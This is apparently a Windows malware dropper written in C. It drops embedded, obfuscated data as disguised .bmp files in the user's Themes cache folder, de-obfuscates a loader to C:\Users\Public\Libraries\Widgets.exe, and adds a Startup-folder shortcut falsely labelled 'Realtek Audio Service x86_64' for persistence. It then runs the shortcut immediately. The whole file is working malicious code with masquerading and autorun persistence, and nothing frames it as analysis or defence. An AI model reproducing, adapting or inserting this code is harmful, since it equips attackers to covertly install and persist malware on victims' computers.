#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// Include the generated headers
#include "includes/gostData_1.h"
#include "includes/gostData_2.h"
#include "includes/gostData_3.h"
#include "includes/gostData_4.h"
#include "includes/loaderData.h"
#include <shobjidl.h>

extern void nibbleBaseDeObfuscate(char *input, char *output);

/* Compute encoded block size based on first 2 bytes */
static inline int get_block_size(const unsigned char *in) {
    int mode = in[0];
    int meta = in[1];
    return 2 + meta + 25 + (mode ? 50 : 25);
}

void writeFileToLocation(const char *formatedPath, const char *filename, unsigned char *data, unsigned int len) {

    char path[MAX_PATH] = {0};

    char username[256];
    DWORD size = sizeof(username);
    char output_path[512];

    if(!GetUserName(username, &size)) {
        //printf("Failed to get username\n");
        return;
    }

    sprintf(path, formatedPath, username);
    
    char tmp[MAX_PATH];
    char *p = NULL;

    strncpy(tmp, path, MAX_PATH);
    tmp[MAX_PATH - 1] = '\0';

    for (p = tmp + 3; *p; p++) {
        if (*p == '\\' || *p == '/') {
            char old = *p;
            *p = '\0';
            CreateDirectoryA(tmp, NULL);
            *p = old;
        }
    }
    CreateDirectoryA(tmp, NULL);

    
    sprintf(path, "%s\\%s" , path, filename);

    FILE *fp = fopen(path, "wb");
    if (fp) {
        fwrite(data, 1, len, fp);
        fclose(fp);
        //printf("%s saved to Desktop!\n", filename);
    } else {
        //printf("Failed to write %s\n", filename);
    }

}


/* Decode encoded_data[] and write to output file */
int decode_to_file(const char *input_path, const char *filename, const unsigned char *encoded_data, size_t total) {
    char path[MAX_PATH] = {0};
    strcpy(path, input_path);

    char tmp[MAX_PATH];
    char *p = NULL;

    strncpy(tmp, path, MAX_PATH);
    tmp[MAX_PATH - 1] = '\0';

    for (p = tmp + 3; *p; p++) {
        if (*p == '\\' || *p == '/') {
            char old = *p;
            *p = '\0';
            CreateDirectoryA(tmp, NULL);
            *p = old;
        }
    }
    CreateDirectoryA(tmp, NULL);

    
    sprintf(path, "%s\\%s" , path, filename);

    FILE *fo = fopen(path, "wb");
    if (!fo) {
        //perror("Cannot open output file");
        return -1;
    }

    size_t pos = 0;

    unsigned char block[512];
    unsigned char decoded[512];

    while (pos + 2 <= total) {
        int block_size = get_block_size(&encoded_data[pos]);
        if (pos + block_size > total)
            break;

        memcpy(block, &encoded_data[pos], block_size);

        nibbleBaseDeObfuscate((char*)block, (char*)decoded);

        fwrite(decoded, 1, 50, fo);

        pos += block_size;
    }

    fclose(fo);
    return 0;
}

void place_shortcut(const char *target_path, const char *shortcut_path) {
    // Initialize COM library
    CoInitialize(NULL);

    IShellLinkA *pShellLink = NULL;
    HRESULT hres = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLinkA, (void**)&pShellLink);
    if (SUCCEEDED(hres)) {
        // Set the target path for the shortcut
        pShellLink->lpVtbl->SetPath(pShellLink, target_path); //EX: - target_path = C:\Users\Public\Libraries\widgets.exe
        pShellLink->lpVtbl->SetDescription(pShellLink, "Realtek Audio Service x86_64");

        // Query for the IPersistFile interface
        IPersistFile *pPersistFile = NULL;
        hres = pShellLink->lpVtbl->QueryInterface(pShellLink, &IID_IPersistFile, (void**)&pPersistFile);
        if (SUCCEEDED(hres)) {
            // Save the shortcut
            WCHAR wszShortcutPath[MAX_PATH];
            MultiByteToWideChar(CP_ACP, 0, shortcut_path, -1, wszShortcutPath, MAX_PATH);
            pPersistFile->lpVtbl->Save(pPersistFile, wszShortcutPath, TRUE);
            pPersistFile->lpVtbl->Release(pPersistFile);
        }
        pShellLink->lpVtbl->Release(pShellLink);
    }

    // Uninitialize COM library
    CoUninitialize();
}

void execute_shortcut(const char *shortcut_path) {
    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(SHELLEXECUTEINFOA);
    sei.fMask = 0;
    sei.hwnd = NULL;
    sei.lpVerb = "open";
    sei.lpFile = shortcut_path;
    sei.lpParameters = NULL;
    sei.lpDirectory = NULL;
    sei.nShow = SW_SHOWNORMAL;
    sei.hInstApp = NULL;

    // execute the shortcut without waiting
    ShellExecuteExA(&sei);
}

int main() {

    const char *formated_path_for_bmp = "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\cache";
    const char *path_for_loader = "C:\\Users\\Public\\Libraries";
    // Copy 4 images with new names
    writeFileToLocation(formated_path_for_bmp, "cc3a26f5b4243c012f4c5d7cac5f4edf.bmp", data_1, 0x16B6);
    writeFileToLocation(formated_path_for_bmp, "d41d8cd98f00b204e9800998ecf8427e.bmp", data_2, 0x16B6);
    writeFileToLocation(formated_path_for_bmp, "e4d909c290d0fb1ca068ff2f2bda6f0e.bmp", data_3, 0x16B6);
    writeFileToLocation(formated_path_for_bmp, "45c48cce2e2d7fbdea1afc51c7c6ad26.bmp", data_4, 0x16B6);

    // Copy loader to startup folder and add fake name call Realtek Audio Service x86_64.exe
    decode_to_file(path_for_loader, "Widgets.exe", loader_data, sizeof(loader_data));

    char username[256];
    DWORD size = sizeof(username);
    char output_path[512];

    if(!GetUserName(username, &size)) {
        //printf("Failed to get username\n");
        return -1;
    }

    char path_to_shortcut[MAX_PATH] = {0};
    sprintf(path_to_shortcut, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek Audio Service x86_64.lnk", username);
    place_shortcut("C:\\Users\\Public\\Libraries\\Widgets.exe", path_to_shortcut);

    execute_shortcut(path_to_shortcut);

    return 0;
}
